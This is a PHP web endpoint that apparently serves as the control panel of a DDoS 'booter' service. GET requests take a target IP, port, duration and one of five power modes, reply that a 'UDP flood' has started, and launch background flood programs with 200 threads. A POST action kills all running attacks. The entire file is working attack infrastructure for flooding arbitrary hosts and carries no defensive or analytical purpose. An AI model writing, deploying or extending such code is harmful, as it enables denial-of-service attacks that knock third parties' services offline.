<?php

// Function to execute the bash script in the background
function executeBashScript($command, $ip, $port, $time, $threads) {
    // Construct the bash command
    $bashCommand = "$command " . escapeshellarg($ip) . " " . escapeshellarg($port) . " " . escapeshellarg($time) . " " . escapeshellarg($threads) . " > /dev/null 2>/dev/null &";

    // Execute the bash command in the background
    exec($bashCommand);
}

// Function to kill all attack processes
function killAllAttacks() {
    // Execute the command to kill all background attack processes
    shell_exec("pkill -f 'low|high|turbo|max|experiment'");
}

// Check if the request method is GET
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    // Check if necessary parameters are present
    if(isset($_GET['mode']) && isset($_GET['ip']) && isset($_GET['port']) && isset($_GET['time'])) {
        // Extract parameters and sanitize input
        $mode = filter_var($_GET['mode'], FILTER_VALIDATE_INT); // Validate as integer
        $ip = filter_var($_GET['ip'], FILTER_VALIDATE_IP);
        $port = filter_var($_GET['port'], FILTER_VALIDATE_INT, array('options' => array('min_range' => 1, 'max_range' => 65535))); // Validate within range
        $time = filter_var($_GET['time'], FILTER_VALIDATE_INT, array('options' => array('min_range' => 1))); // Ensure positive integer
        $threads = 200; // Default value for threads

        // Validate IP address and port
        if($ip !== false && $port !== false && $time !== false && $mode !== false) {

            // Determine which command to run
            switch ($mode) {
                case 1:
                    // Send the response immediately
                    http_response_code(200);
                    echo json_encode(['error' => false, 'response' => "Low power mode UDP flood started to $ip:$port with $threads threads for $time seconds."]);
                    executeBashScript('low', $ip, $port, $time, $threads);
                    break;
                case 2:
                    // Send the response immediately
                    http_response_code(200);
                    echo json_encode(['error' => false, 'response' => "High power mode UDP flood started to $ip:$port with $threads threads for $time seconds."]);
                    executeBashScript('high', $ip, $port, $time, $threads);
                    break;
                case 3:
                    // Send the response immediately
                    http_response_code(200);
                    echo json_encode(['error' => false, 'response' => "Turbo power mode UDP flood started to $ip:$port with $threads threads for $time seconds."]);
                    executeBashScript('turbo', $ip, $port, $time, $threads);
                    break;
                case 4:
                    // Send the response immediately
                    http_response_code(200);
                    echo json_encode(['error' => false, 'response' => "Max power mode UDP flood started to $ip:$port with $threads threads for $time seconds."]);
                    executeBashScript('max', $ip, $port, $time, $threads);
                    break;
                case 5:
                    // Send the response immediately
                    http_response_code(200);
                    echo json_encode(['error' => false, 'response' => "Experimented mode UDP flood started to $ip:$port with $threads threads for $time seconds."]);
                    executeBashScript('experiment', $ip, $port, $time, $threads);
                    break;
                default:
                    http_response_code(400); // Bad Request
                    echo json_encode(['error' => true, 'reason' => 'Invalid command']);
                    exit;
            }
        } else {
            // Invalid parameters
            http_response_code(400); // Bad Request
            echo json_encode(['error' => true, 'reason' => 'Invalid parameters']);
        }
    } else {
        // Missing parameters
        http_response_code(400); // Bad Request
        echo json_encode(['error' => true, 'reason' => 'Missing parameters']);
    }
} elseif ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // POST request handling
    // Check if it's a request to kill all attacks
    if (isset($_POST['action']) && $_POST['action'] === 'killAllAttacks') {
        // Call function to kill all attacks
        killAllAttacks();

        // Send success response
        http_response_code(200);
        echo json_encode(['error' => false, 'response' => 'All ongoing attacks have been terminated.']);
    } else {
        // Invalid POST request
        http_response_code(400); // Bad Request
        echo json_encode(['error' => true, 'reason' => 'Invalid action']);
    }
} else {
    // Handle requests other than GET
    http_response_code(405); // Method Not Allowed
    echo json_encode(['error' => true, 'reason' => 'Invalid request method']);
}
?>
